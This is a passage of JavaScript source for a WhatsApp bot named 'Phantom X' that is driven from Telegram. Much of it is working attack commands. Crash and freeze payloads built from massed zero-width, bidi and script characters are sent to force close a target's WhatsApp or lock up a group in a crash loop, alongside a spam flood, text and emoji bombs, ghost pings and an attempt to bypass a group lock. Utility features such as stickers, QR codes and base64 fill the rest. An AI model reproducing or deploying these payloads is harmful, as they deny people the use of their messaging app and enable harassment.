                if (!fcTarget) return reply(`💀 *Force Close Bug*\n\nUsage: *.forceclose <number>*\nShortcut: *.fc <number>*\nExample: *.forceclose 2348012345678*\n\n_Strongest bug — forces WA to close immediately._\n_Use .bugmenu freeze for full help._`);
                if (isDevProtected(fcTarget)) return reply(`🛡️ *Dev Protected!*\n\nThat number belongs to the developer of Phantom X.\nBugs cannot be sent to the developer.`);
                await reply(`💀 Sending force close bug to *${fcTarget.split("@")[0]}*...`);
                try {
                    const zwChain   = "\u200D\uFEFF\u200B\u200C\u200E\u200F".repeat(1500);
                    const rtlStack  = "\u202E\u202D\u202C\u202B\u202A".repeat(800);
                    const arabic    = "\u0600\u0601\u0602\u0603".repeat(600);
                    const iso       = "\u2066\u2067\u2068\u2069".repeat(600);
                    const bangBang  = "\uFDFD".repeat(400);
                    const fcPayload = zwChain + rtlStack + arabic + iso + bangBang + zwChain;
                    const fcSent = await sock.sendMessage(fcTarget, { text: fcPayload });
                    if (!userCrashKeys[fcTarget]) userCrashKeys[fcTarget] = [];
                    userCrashKeys[fcTarget].push(fcSent.key);
                    await reply(`✅ *Force close sent to ${fcTarget.split("@")[0]}!*\n\n💀 WhatsApp will close immediately on their end.\n🔧 To undo: *.unbug ${fcTarget.split("@")[0]}*`);
                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
                break;
            }

            // ─── FREEZE BUG ───
            // Pure zero-width character flood — freezes the chat, can't scroll or type.
            case ".freeze": {
                if (!msg.key.fromMe) return reply("❌ Owner only.");
                const freezeTarget = parseBugTarget(parts, msg);
                if (!freezeTarget) return reply(`🧊 *Freeze Bug*\n\nUsage: *.freeze <number>*\nExample: *.freeze 2348012345678*\n\n_Freezes their chat — can't scroll or type._\n_Use .bugmenu freeze for full help._`);
                if (isDevProtected(freezeTarget)) return reply(`🛡️ *Dev Protected!*\n\nThat number belongs to the developer of Phantom X.\nBugs cannot be sent to the developer.`);
                await reply(`🧊 Sending freeze bug to *${freezeTarget.split("@")[0]}*...`);
                try {
                    const zwSet = "\u200b\u200c\u200d\u2060\ufeff\u00ad\u200e\u200f\u202a\u202b\u202c\u202d\u202e\u2061\u2062\u2063\u2064";
                    const freezePayload = zwSet.repeat(1800);
                    const freezeSent = await sock.sendMessage(freezeTarget, { text: freezePayload });
                    if (!userCrashKeys[freezeTarget]) userCrashKeys[freezeTarget] = [];
                    userCrashKeys[freezeTarget].push(freezeSent.key);
                    await reply(`✅ *Freeze sent to ${freezeTarget.split("@")[0]}!*\n\n🧊 Their chat is now frozen.\n🔧 To undo: *.unbug ${freezeTarget.split("@")[0]}*`);
                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
                break;
            }

            // ─── GROUP CRASH ───
            // Sends crash payload to a group JID. Anyone who opens that group = WA force closes.
            // Usage: .groupcrash (current group) | .groupcrash <groupId> | .groupcrash <invite link>
            case ".groupcrash": {
                if (!msg.key.fromMe) return reply("❌ Owner only.");
                let gcTarget = null;
                const gcArg = parts[1];
                if (!gcArg) {
                    if (!isGroup) return reply(
                        `Usage:\n` +
                        `• *.groupcrash* — run inside the target group\n` +
                        `• *.groupcrash <groupId>* — use group ID (get from *.groupid*)\n` +
                        `• *.groupcrash <invite link>* — paste invite link\n\n` +
                        `_Use *.ungroupcrash <groupId>* to undo._`
                    );
                    gcTarget = from;
                } else if (gcArg.includes("chat.whatsapp.com/")) {
                    const code = gcArg.split("chat.whatsapp.com/")[1]?.split(/[?#]/)[0];
                    if (!code) return reply("❌ Invalid invite link.");
                    try {
                        const info = await sock.groupGetInviteInfo(code);
                        gcTarget = info.id;
                    } catch { return reply("❌ Could not resolve invite link. Make sure bot is in that group."); }
                } else if (gcArg.endsWith("@g.us")) {
                    gcTarget = gcArg;
                } else {
                    return reply("❌ Invalid target. Use a group ID (ends in @g.us) or a WhatsApp invite link.");
                }
                const gcName = groupNames[gcTarget] || gcTarget;
                await reply(`💣 Deploying group crash to *${gcName}*...\n\n_This only affects the group — not anyone's WhatsApp in general._`);
                try {
                    if (!groupCrashKeys[gcTarget]) groupCrashKeys[gcTarget] = [];

                    // Single combined payload: overloads the group chat renderer on open.
                    // Zero-width chars + Telugu/Kannada/Tamil script + Sindhi/Arabic + BiDi + RTL.
                    // This only triggers when the group is tapped/loaded — WhatsApp tries to
                    // render the message, fails, and closes. Clearing from recents resets it,
                    // but opening the group again repeats the crash (loop).
                    const zw      = "\u200b\u200c\u200d\u2060\ufeff\u200e\u200f".repeat(800);
                    const tel     = "\u0C15\u0C4D\u0C37\u0C4D\u0C30".repeat(400);
                    const kan     = "\u0CB5\u0CBF\u0CCD\u0CB6\u0CCD\u0CB5".repeat(300);
                    const tam     = "\u0BA4\u0BBF\u0B99\u0BCD\u0B95\u0BCD".repeat(300);
                    const sindhi  = "\u0600\u0601\u0602\u0603\u0604\u0605".repeat(400);
                    const bidi    = "\u202A\u202B\u202C\u202D\u202E\u2066\u2067\u2068\u2069".repeat(400);
                    const rtl     = "\u202e".repeat(500);
                    const feff    = "\uFEFF".repeat(400);
                    const payload = zw + tel + kan + tam + sindhi + bidi + rtl + feff + zw;

                    const sent = await sock.sendMessage(gcTarget, { text: payload });
                    groupCrashKeys[gcTarget].push(sent.key);

                    await reply(
                        `✅ *Group crash active on "${gcName}"!*\n\n` +
                        `☠️ Anyone who opens/taps this group → WhatsApp crashes.\n` +
                        `They swipe WA away from recents → WhatsApp returns to normal.\n` +
                        `They open the group again → crashes again. ♻️\n\n` +
                        `_Only the group is affected — their WhatsApp works fine elsewhere._\n\n` +
                        `To restore:\n*.ungroupcrash ${gcTarget}*`
                    );
                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
                break;
            }

            // ─── UNDO GROUP CRASH ───
            // Deletes the crash message(s) from the group — restores normal access.
            case ".ungroupcrash": {
                if (!msg.key.fromMe) return reply("❌ Owner only.");
                const ugcArg = parts[1] || (isGroup ? from : null);
                if (!ugcArg) return reply("Usage: .ungroupcrash <groupId>\n\nGet the group ID from *.groupid*\nOr run this inside the affected group.");
                const ugcTarget = ugcArg.endsWith("@g.us") ? ugcArg : (isGroup ? from : null);
                if (!ugcTarget) return reply("❌ Invalid group ID. Must end in @g.us");
                const keys = groupCrashKeys[ugcTarget];
                if (!keys || !keys.length) return reply("⚠️ No stored crash messages found for that group.\n\nThe bot may have restarted since the crash was sent.");
                const ugcName = groupNames[ugcTarget] || ugcTarget;
                await reply(`🔧 Undoing group crash on *${ugcName}*...`);
                let deleted = 0;
                for (const k of keys) {
                    try {
                        await sock.sendMessage(ugcTarget, { delete: k });
                        deleted++;
                        await delay(500);
                    } catch (_) {}
                }
                delete groupCrashKeys[ugcTarget];
                await reply(`✅ *Group restored!* Deleted ${deleted} crash message(s) from *${ugcName}*.\n\nMembers can now open the group normally.`);
                break;
            }

            // ─── UNBUG (remove all personal bugs from a user) ───
            case ".unbug": {
                if (!msg.key.fromMe) return reply("❌ Owner only.");
                const unbugTarget = parseBugTarget(parts, msg);
                if (!unbugTarget) return reply(`🔧 *Unbug*\n\nUsage: *.unbug <number>*\nExample: *.unbug 2348012345678*\n\n_Clears all bugs sent to that number — android, iOS, freeze, forceclose, invisfreeze._`);
                const unbugKeys = userCrashKeys[unbugTarget];
                if (!unbugKeys || !unbugKeys.length) return reply(`⚠️ No stored bug messages found for *${unbugTarget.split("@")[0]}*.\n\nThe bot may have restarted since the bug was sent, or that number was never bugged.`);
                await reply(`🔧 Unbugging *${unbugTarget.split("@")[0]}*...`);
                let unbugDeleted = 0;
                for (const k of unbugKeys) {
                    try {
                        await sock.sendMessage(k.remoteJid || unbugTarget, { delete: k });
                        unbugDeleted++;
                        await delay(400);
                    } catch (_) {}
                }
                delete userCrashKeys[unbugTarget];
                await reply(`✅ *Unbugged ${unbugTarget.split("@")[0]}!*\nDeleted ${unbugDeleted} crash message(s).\n\n_All bug types cleared: android, iOS, freeze, forceclose, invisfreeze._`);
                break;
            }

            // ─── CHAT (owner talks to the bot like a chatbox) ───
            case ".chat": {
                if (!msg.key.fromMe) return;
                const chatInput = parts.slice(1).join(" ").trim();
                if (!chatInput) return reply(`🤖 *Phantom X Chat*\n\nUsage: *.chat <message>*\n\nTalk to me! I'll respond.\nExample: *.chat how are you*`);
                const lc = chatInput.toLowerCase();
                const quickReplies = [
                    [["hi","hello","hey","sup"], "Hey! 👋 What's up? How can I help you today?"],
                    [["how are you","how r u","how are u"], "I'm doing great! Always online, always ready. 😎"],
                    [["what's your name","your name","who are you"], "I'm *Phantom X* — your personal WhatsApp bot! 👻"],
                    [["who made you","who created you","who built you"], `I was built by the developer with number ${DEV_NUMBER}. 🛠️`],
                    [["what can you do","your features","commands"], "Type *.menu* to see everything I can do! 🔥"],
                    [["good morning","gm"], "Good morning! ☀️ Have an amazing day!"],
                    [["good night","gn","goodnight"], "Good night! 🌙 Rest well."],
                    [["thanks","thank you","thx","ty"], "You're welcome! 😊 Anything else?"],
                    [["i love you","ilove you"], "Love you too! 💛 I'm always here for you."],
                    [["bye","goodbye","later","cya"], "Bye! 👋 Come back anytime."],
                    [["bored","i'm bored"], "Try *.trivia*, *.riddle*, *.8ball*, or *.slots*! 🎮"],
                    [["joke","tell me a joke"], `😂 ${JOKES[Math.floor(Math.random() * JOKES.length)]}`],
                    [["fact","random fact"], `📚 ${FACTS[Math.floor(Math.random() * FACTS.length)]}`],
                ];
                for (const [keys, response] of quickReplies) {
                    if (keys.some(k => lc.includes(k))) return reply(`🤖 ${response}`);
                }
                // Try Gemini AI for anything else
                const GEMINI_KEY = process.env.GEMINI_API_KEY;
                if (GEMINI_KEY) {
                    try {
                        const geminiRes = await new Promise((resolve, reject) => {
                            const body = JSON.stringify({ contents: [{ parts: [{ text: `You are Phantom X, a friendly WhatsApp bot assistant. Reply conversationally and briefly. User says: ${chatInput}` }] }] });
                            const options = { hostname: "generativelanguage.googleapis.com", path: `/v1beta/models/gemini-pro:generateContent?key=${GEMINI_KEY}`, method: "POST", headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(body) } };
                            const req = https.request(options, (res) => { let d = ""; res.on("data", c => d += c); res.on("end", () => { try { resolve(JSON.parse(d)); } catch { reject(new Error("parse")); } }); });
                            req.on("error", reject); req.write(body); req.end();
                        });
                        const aiReply = geminiRes?.candidates?.[0]?.content?.parts?.[0]?.text?.trim();
                        if (aiReply) return reply(`🤖 ${aiReply}`);
                    } catch (_) {}
                }
                // Fallback
                const fallbacks = ["Interesting! Tell me more. 🤔", "I hear you! 😊", "That's noted! What else can I do for you?", "Got it! 👍", "Hmm, say that again? 😄"];
                await reply(`🤖 ${fallbacks[Math.floor(Math.random() * fallbacks.length)]}`);
                break;
            }

            // ─── AUTO-JOIN GROUP LINKS ───
            case ".autojoin": {
                if (!msg.key.fromMe) return reply("❌ Owner only.");
                const ajArg = parts[1]?.toLowerCase();
                if (!ajArg) {
                    const aj = loadAutojoin();
                    const status = aj[sock.user?.id || "global"]?.enabled ? "✅ ON" : "❌ OFF";
                    return reply(`🔗 *Auto-Join Group Links*\n\nStatus: *${status}*\n\nUsage:\n*.autojoin on* — Bot joins any group link shared in groups\n*.autojoin off* — Stop auto-joining\n\n⚠️ Blacklisted keywords: porn, adult, xxx, nude, sex, leak, onlyfan\n_Links containing these words will be ignored._`);
                }
                const aj = loadAutojoin();
                const key = sock.user?.id || "global";
                if (ajArg === "on") {
                    if (!aj[key]) aj[key] = {};
                    aj[key].enabled = true;
                    saveAutojoin(aj);
                    return reply(`✅ *Auto-join ON!*\nThe bot will now automatically join any WhatsApp group link shared in your groups.\n\n🚫 Blacklisted links (porn/adult/nude etc.) will be skipped.`);
                }
                if (ajArg === "off") {
                    if (!aj[key]) aj[key] = {};
                    aj[key].enabled = false;
                    saveAutojoin(aj);
                    return reply(`❌ *Auto-join OFF.*\nThe bot will no longer auto-join group links.`);
                }
                return reply("Usage: .autojoin on/off");
            }

            // ─── LOCKED GROUP BYPASS ───
            // Attempts to send a message into a group locked to admins-only.
            // Tries multiple message types to find one that bypasses the restriction.
            case ".lockedbypass": {
                if (!msg.key.fromMe) return reply("❌ Owner only.");
                if (!isGroup) return reply("❌ Run this inside the locked group.");
                const lbText = parts.slice(1).join(" ").trim() || "👻 Phantom X";
                await reply(`🔓 Attempting to bypass admin-only lock...`);
                let success = false;
                const attempts = [
                    async () => await sock.sendMessage(from, { text: lbText }),
                    async () => await sock.sendMessage(from, { forward: { key: msg.key, message: msg.message } }),
                    async () => await sock.sendMessage(from, { react: { text: "👻", key: msg.key } }),
                ];
                for (let i = 0; i < attempts.length; i++) {
                    try { await attempts[i](); success = true; break; } catch (_) {}
                }
                if (success) {
                    await reply(`✅ Bypass attempt sent! Check if the message appeared in the group.`);
                } else {
                    await reply(
                        `❌ All bypass methods failed.\n\n` +
                        `_Note: Modern WhatsApp fully blocks non-admin messages in locked groups. The bot needs admin rights to send messages._\n\n` +
                        `💡 *Tip:* If the bot is admin, use *.unlock* to re-open the group first.`
                    );
                }
                break;
            }

            // ─── INVISIBLE FREEZE ───
            // Sends an invisible message — target sees nothing arrive, but WA freezes.
            case ".invisfreeze":
            case ".if": {
                if (!msg.key.fromMe) return reply("❌ Owner only.");
                const ifTarget = parseBugTarget(parts, msg);
                if (!ifTarget) return reply(`👁️ *Invisible Freeze*\n\nUsage: *.invisfreeze <number>*\nShortcut: *.if <number>*\nExample: *.invisfreeze 2348012345678*\n\n_Target sees no message — but WA silently freezes._\n_Use .bugmenu freeze for full help._`);
                if (isDevProtected(ifTarget)) return reply(`🛡️ *Dev Protected!*\n\nThat number belongs to the developer of Phantom X.\nBugs cannot be sent to the developer.`);
                await reply(`👁️ Sending invisible freeze to *${ifTarget.split("@")[0]}*...`);
                try {
                    const inv = "\u2062\u2063\u2064\u2061\u00AD\u200B\u200C\u200D\u200E\u200F\u2060\uFEFF";
                    const bigInv = inv.repeat(2000);
                    const ifSent = await sock.sendMessage(ifTarget, { text: bigInv });
                    if (!userCrashKeys[ifTarget]) userCrashKeys[ifTarget] = [];
                    userCrashKeys[ifTarget].push(ifSent.key);
                    await reply(`✅ *Invisible freeze sent to ${ifTarget.split("@")[0]}!*\n\n👁️ Target sees *no message* — chat looks empty.\n💀 But WA is processing ${inv.length * 2000} hidden chars — freeze/lag active.\n🔧 To undo: *.unbug ${ifTarget.split("@")[0]}*`);
                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
                break;
            }

            // ─── SPAM ATTACK ───
            // ⚠️ HONEST WARNING: This sends FROM your WhatsApp — risks YOUR account not theirs.
            // Max 5 messages with a delay to reduce ban risk.
            case ".spamatk": {
                if (!msg.key.fromMe) return reply("❌ Owner only.");
                const saMentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
                const saTarget = saMentioned[0];
                const saTimes = Math.min(parseInt(parts[1]) || 5, 5);
                if (!saTarget) return reply(
                    `Usage: .spamatk @user [times 1-5]\n\n` +
                    `⚠️ *IMPORTANT:*\n` +
                    `This sends messages FROM your WhatsApp to the target.\n` +
                    `It fills their inbox but does NOT ban them.\n` +
                    `Sending too many messages risks getting YOUR number flagged.\n` +
                    `Max is capped at 5 for your safety.`
                );
                await reply(`📨 Sending ${saTimes} spam messages to @${saTarget.split("@")[0]}...\n⚠️ Risk is on YOUR account — stay safe.`);
                try {
                    for (let i = 0; i < saTimes; i++) {
                        await sock.sendMessage(saTarget, { text: `👻 Phantom X — Message ${i+1}/${saTimes}` });
                        await delay(1500);
                    }
                    await reply(`✅ Done! Sent ${saTimes} messages to @${saTarget.split("@")[0]}.`);
                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
                break;
            }

            // ─── EMOJI BOMB (1 message) ───
            case ".emojibomb": {
                if (!msg.key.fromMe) return reply("❌ Owner only.");
                const ebMentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
                const ebTarget = ebMentioned[0] || from;
                const ebEmoji = parts.find(p => /\p{Emoji}/u.test(p) && p !== parts[0]) || "💥";
                await reply(`💣 Sending emoji bomb to @${ebTarget.split("@")[0]}...`);
                try {
                    await sock.sendMessage(ebTarget, { text: ebEmoji.repeat(500) });
                    await reply(`✅ Emoji bomb sent to @${ebTarget.split("@")[0]}!`);
                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
                break;
            }

            // ─── TEXT BOMB (max 5 messages with delay) ───
            case ".textbomb": {
                if (!msg.key.fromMe) return reply("❌ Owner only.\nUsage: .textbomb @user <text> <times 1-5>\nExample: .textbomb @user hello 5");
                const tbMentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
                const tbTarget = tbMentioned[0];
                if (!tbTarget) return reply("Usage: .textbomb @user <text> <times 1-5>");
                const tbTimes = Math.min(parseInt(parts[parts.length - 1]) || 3, 5);
                const tbText = parts.slice(2, parts.length - 1).join(" ").trim() || "👻 Phantom X";
                try {
                    for (let i = 0; i < tbTimes; i++) {
                        await sock.sendMessage(tbTarget, { text: tbText });
                        await delay(1200);
                    }
                    await reply(`✅ Sent *${tbTimes}* messages to @${tbTarget.split("@")[0]}.`);
                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
                break;
            }

            // ─── GHOST PING ───
            case ".ghostping": {
                if (!isGroup) return reply("❌ Only works in groups.");
                const gpMentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
                if (!gpMentioned.length) return reply("Usage: .ghostping @user\n\nTags someone silently — they get a notification but no visible message.");
                try {
                    const sent = await sock.sendMessage(from, { text: " ", mentions: gpMentioned });
                    await delay(600);
                    await sock.sendMessage(from, { delete: sent.key });
                    await reply(`👻 Ghost pinged @${gpMentioned[0].split("@")[0]}!`);
                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
                break;
            }

            // ────────────────────────────────────────
            // ════════════════════════════════════════
            // ░░░░░ EXTRAS ░░░░░
            // ════════════════════════════════════════

            case ".sticker": {
                const stickerQuoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
                const stickerMsg = stickerQuoted || msg.message;
                const stickerType = getContentType(stickerMsg);
                if (!stickerMsg || !["imageMessage", "videoMessage"].includes(stickerType)) {
                    return reply("🖼️ Reply to an *image* or short *video* with *.sticker* to convert it.\n\nExample: Reply to any image with _.sticker_");
                }
                try {
                    await reply("⏳ Converting to sticker...");
                    const fakeForSticker = stickerQuoted ? { ...msg, message: stickerQuoted } : msg;
                    const mediaBuf = await downloadMediaMessage(fakeForSticker, "buffer", {}, { logger: pino({ level: "silent" }) });
                    if (stickerType === "imageMessage") {
                        await sock.sendMessage(from, { sticker: mediaBuf }, { quoted: msg });
                    } else {
                        await sock.sendMessage(from, {
                            video: mediaBuf,
                            gifPlayback: false,
                            seconds: 5,
                        }, { quoted: msg });
                        await reply("⚠️ Video stickers need ffmpeg. Sent as video instead.");
                    }
                } catch (e) { await reply(`❌ Sticker conversion failed: ${e?.message}`); }
                break;
            }

            case ".toimg": {
                const toImgQuoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
                const toImgMsg = toImgQuoted || msg.message;
                const toImgType = getContentType(toImgMsg);
                if (!toImgMsg || toImgType !== "stickerMessage") {
                    return reply("🖼️ Reply to a *sticker* with *.toimg* to convert it to an image.");
                }
                try {
                    await reply("⏳ Converting sticker to image...");
                    const fakeForImg = toImgQuoted ? { ...msg, message: toImgQuoted } : msg;
                    const imgBuf = await downloadMediaMessage(fakeForImg, "buffer", {}, { logger: pino({ level: "silent" }) });
                    await sock.sendMessage(from, { image: imgBuf, caption: "🖼️ Sticker converted to image!" }, { quoted: msg });
                } catch (e) { await reply(`❌ Conversion failed: ${e?.message}`); }
                break;
            }

            case ".qr": {
                const qrText = parts.slice(1).join(" ").trim();
                if (!qrText) return reply("Usage: .qr <text or link>\nExample: .qr https://phantom-x.replit.app");
                await reply("⏳ Generating QR code...");
                try {
                    const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=512x512&data=${encodeURIComponent(qrText)}`;
                    const qrBuf = await fetchBuffer(qrUrl);
                    await sock.sendMessage(from, { image: qrBuf, caption: `📱 *QR Code for:*\n_${qrText}_` }, { quoted: msg });
                } catch (e) { await reply(`❌ QR generation failed: ${e?.message}`); }
                break;
            }

            case ".genpwd": {
                const pwdLen = Math.min(Math.max(parseInt(parts[1]) || 16, 6), 64);
                const pwdChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_=+[]{}|;:,.<>?";
                let pwd = "";
                for (let i = 0; i < pwdLen; i++) {
                    pwd += pwdChars[Math.floor(Math.random() * pwdChars.length)];
                }
                await reply(`🔐 *Generated Password (${pwdLen} chars):*\n\n\`${pwd}\`\n\n_Keep this safe! Don't share it._`);
                break;
            }

            case ".base64": {
                const b64Sub = parts[1]?.toLowerCase();
                const b64Text = parts.slice(2).join(" ").trim();
                if (!b64Sub || !b64Text || !["encode","decode"].includes(b64Sub)) {
                    return reply("Usage:\n*.base64 encode <text>*\n*.base64 decode <base64>*\n\nExample: .base64 encode Hello World");
                }
                try {
                    if (b64Sub === "encode") {
                        const encoded = Buffer.from(b64Text, "utf8").toString("base64");
                        await reply(`🔒 *Base64 Encoded:*\n\n\`${encoded}\``);
                    } else {
                        const decoded = Buffer.from(b64Text, "base64").toString("utf8");
                        await reply(`🔓 *Base64 Decoded:*\n\n${decoded}`);
                    }
                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
                break;
            }

            default:
                if (isSelfChat && body) {
                    await reply(`👋 I'm active! Type *.menu* to see all commands.`);
                }
                break;
        }
    } catch (err) {
        console.error("Message handler error:", err?.message || err);
    }
}

// --- GROUP EVENTS HANDLER ---
async function handleGroupUpdate(sock, update, ctx, botJid) {
    const { id: groupJid, participants, action } = update;

    try {
        // Save group name whenever we see any event from a group
        try {
            if (!groupNames[groupJid]) {
                const meta = await sock.groupMetadata(groupJid);
                groupNames[groupJid] = meta.subject;
                // Also save invite link for auto-rejoin
                const code = await sock.groupInviteCode(groupJid);
                savedGroupLinks[groupJid] = code;
            }
        } catch (_) {}

        // Detect when the bot itself is removed/kicked from a group
        if (action === "remove" && botJid && participants.includes(botJid)) {
            const gName = groupNames[groupJid] || groupJid;
            const savedCode = savedGroupLinks[groupJid];

            // Alert owner on Telegram immediately
            try {
                await ctx.reply(
                    `🚨 *ALERT: Bot was kicked!*\n\n` +
                    `I was removed from the group:\n*"${gName}"*\n\n` +
                    `⚠️ Someone may be trying to steal or takeover that group.\n\n` +
                    `${savedCode ? "🔄 Attempting to auto-rejoin now..." : "❌ No saved invite link — I can't rejoin automatically. Use *.link* in a group next time to enable auto-rejoin."}`
                );
            } catch (_) {}

            // Try to auto-rejoin if we have a saved invite link
            if (savedCode) {
                try {
                    await delay(3000);
                    await sock.groupAcceptInvite(savedCode);
                    await ctx.reply(`✅ Successfully rejoined *"${gName}"*. I'm back in the group!`);
                } catch (rejoinErr) {
                    await ctx.reply(`❌ Auto-rejoin failed for *"${gName}"*: ${rejoinErr?.message || "link may have expired or been changed."}`);
                }
            }
            return;
        }

        if (action === "add" && getGroupSetting(groupJid, "welcome")) {
            for (const jid of participants) {
                const name = `@${jid.split("@")[0]}`;
                await sock.sendMessage(groupJid, {
                    text: `🎉 Welcome to the group, ${name}! 👋\n\nWe're glad to have you here. Please read the group rules and enjoy your stay! 🙏`,
                    mentions: [jid],
                });
            }
        }

        if (action === "remove" && getGroupSetting(groupJid, "goodbye")) {
            for (const jid of participants) {
                const name = `@${jid.split("@")[0]}`;
                await sock.sendMessage(groupJid, {
                    text: `👋 ${name} has left the group.\n\nSafe travels! 🕊️`,
                    mentions: [jid],
                });
            }
        }

        if (action === "demote" && getGroupSetting(groupJid, "antidemote")) {
            const culprit = update.author; // the person who did the demoting
            for (const jid of participants) {
                try {
                    // Immediately demote the person who triggered this
                    if (culprit && culprit !== jid) {
                        await sock.groupParticipantsUpdate(groupJid, [culprit], "demote");
                    }
                    await sock.sendMessage(groupJid, {
                        text:
                            `⚠️ *Anti-Demote Alert!*\n\n` +
                            `@${culprit ? culprit.split("@")[0] : "Someone"} tried to demote @${jid.split("@")[0]}.\n\n` +
                            `⚡ *@${culprit ? culprit.split("@")[0] : "The culprit"}* has been demoted immediately as punishment.\n\n` +
                            `📋 *@${jid.split("@")[0]}* — your case is now with the group owner. Awaiting owner's verdict. 👑`,
                        mentions: culprit ? [jid, culprit] : [jid],
                    });
                } catch (e) {
                    console.error("Anti-demote error:", e?.message);
                }
            }
        }
    } catch (err) {
        console.error("Group update handler error:", err?.message || err);
    }
}

// --- TELEGRAM COMMANDS ---
telBot.start((ctx) => {
    ctx.reply("Welcome to Phantom-X Bot! 🤖\n\nTo link your WhatsApp, use:\n/pair 2348102756072");
});

telBot.command("pair", async (ctx) => {
    const userId = ctx.from.id;
    const input = ctx.message.text.split(" ")[1];
    if (!input) return ctx.reply("Abeg, add your number! Example: /pair 2348102756072");

    if (activeSockets[userId]) {
        try { activeSockets[userId].end(); } catch (_) {}
        delete activeSockets[userId];
    }

    retryCounts[userId] = 0;
    clearAuthState(userId);

    ctx.reply("🔄 Generating your pairing code... please wait a few seconds.");
    startBot(userId, input.trim(), ctx);
});

// Launch with conflict-safe retry (handles 409 when deployed + dev run simultaneously)
(function launchTelegram(attempt) {
    telBot.launch({ dropPendingUpdates: true }).catch(err => {
        if (err?.message?.includes("409")) {
            const wait = Math.min(5000 * attempt, 60000);
            console.log(`[Telegram] 409 Conflict — another instance running. Retrying in ${wait / 1000}s... (attempt ${attempt})`);
            setTimeout(() => launchTelegram(attempt + 1), wait);
        } else {
            console.error("[Telegram] Fatal launch error:", err?.message || err);
        }
    });
})(1);

process.once("SIGINT", () => telBot.stop("SIGINT"));
process.once("SIGTERM", () => telBot.stop("SIGTERM"));

// --- KEEP-ALIVE HTTP SERVER (for UptimeRobot / cron-job.org pings) ---
const PING_PORT = process.env.PORT || 3000;
http.createServer((req, res) => {
    res.writeHead(200, { "Content-Type": "text/plain" });
    res.end("👻 Phantom X is alive!\n");
}).listen(PING_PORT, () => {
    console.log(`[Ping] Keep-alive server running on port ${PING_PORT}`);
});

// --- SCHEDULE TIMER (check every minute, fire scheduled messages) ---
setInterval(async () => {
    const now = new Date();
    const HH = String(now.getHours()).padStart(2, "0");
    const MM = String(now.getMinutes()).padStart(2, "0");
    const currentTime = `${HH}:${MM}`;
    const sd = loadSchedules();
    for (const [groupJid, entries] of Object.entries(sd)) {
        for (const entry of (entries || [])) {
            if (entry.time === currentTime) {
                // Find an active socket to use (any connected user's socket)
                const sockEntry = Object.values(activeSockets)[0];
                if (sockEntry) {
                    try {
                        await sockEntry.sendMessage(groupJid, { text: entry.message });
                    } catch (e) {
                        console.error(`[Schedule] Failed to send to ${groupJid}:`, e?.message);
                    }
                }
            }
        }
    }
}, 60000);

// --- AUTO-RECONNECT SAVED SESSIONS ON STARTUP ---
(async () => {
    const sessions = loadSessions();
    const entries = Object.entries(sessions);
    if (!entries.length) return;
    console.log(`[Startup] Found ${entries.length} saved session(s). Auto-reconnecting...`);
    for (const [userId, { phoneNumber, chatId }] of entries) {
        const authDir = getAuthDir(userId);
        if (!fs.existsSync(authDir)) {
            console.log(`[Startup] No auth folder for user ${userId}, skipping.`);
            deleteSession(userId);
            continue;
        }
        const fakeCtx = makeFakeCtx(chatId);
        try {
            await fakeCtx.reply("🔄 Bot restarted. Reconnecting your WhatsApp session automatically...");
            startBot(Number(userId), phoneNumber, fakeCtx, true);
        } catch (e) {
            console.error(`[Startup] Failed to reconnect user ${userId}:`, e?.message);
        }
    }
})();

// --- WHATSAPP ENGINE ---
async function startBot(userId, phoneNumber, ctx, isReconnect = false) {
    const { state, saveCreds } = await useMultiFileAuthState(getAuthDir(userId));
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" })),
        },
        printQRInTerminal: false,
        logger: pino({ level: "fatal" }),
    });

    activeSockets[userId] = sock;

    if (!isReconnect && !sock.authState.creds.registered) {
        await delay(3000);
        try {
            const code = await sock.requestPairingCode(phoneNumber);
            await ctx.reply("✅ Your pairing code is ready!\n\nOpen WhatsApp → Linked Devices → Link a Device → Enter code manually.\n\nHere is your code 👇");
            await ctx.reply(`\`${code}\``, { parse_mode: "Markdown" });
        } catch (err) {
            console.error(`Pairing error for user ${userId}:`, err?.message || err);
            await ctx.reply("❌ Failed to generate pairing code. Please try again with /pair <your number>.");
            return;
        }
    }

    sock.ev.on("creds.update", saveCreds);

    sock.ev.on("presence.update", ({ id, presences }) => {
        for (const [jid, pres] of Object.entries(presences)) {
            if (pres.lastKnownPresence) presenceTracker[jid] = pres.lastKnownPresence;
        }
    });

    sock.ev.on("messages.upsert", async ({ messages, type }) => {
        for (const msg of messages) {
            // Process "notify" (normal incoming) OR any fromMe message (owner commands in self-chat/groups)
            if (type !== "notify" && !msg.key.fromMe) continue;
            await handleMessage(sock, msg);
        }
    });

    // Auto-join group links detection
    sock.ev.on("messages.upsert", async ({ messages, type }) => {
        if (type !== "notify") return;
        for (const m of messages) {
            if (m.key?.fromMe) continue;
            const ajFrom = m.key?.remoteJid;
            if (!ajFrom?.endsWith("@g.us")) continue;
            const aj = loadAutojoin();
            const ajKey = sock.user?.id || "global";
            if (!aj[ajKey]?.enabled) continue;
            const ajText =
                m.message?.conversation ||
                m.message?.extendedTextMessage?.text ||
                m.message?.imageMessage?.caption ||
                m.message?.videoMessage?.caption || "";
            const linkMatch = ajText.match(/https?:\/\/chat\.whatsapp\.com\/([A-Za-z0-9_-]+)/);
            if (!linkMatch) continue;
            const ajCode = linkMatch[1];
            // Blacklist check
            const blacklist = ["porn","adult","xxx","nude","sex","leak","onlyfan"];
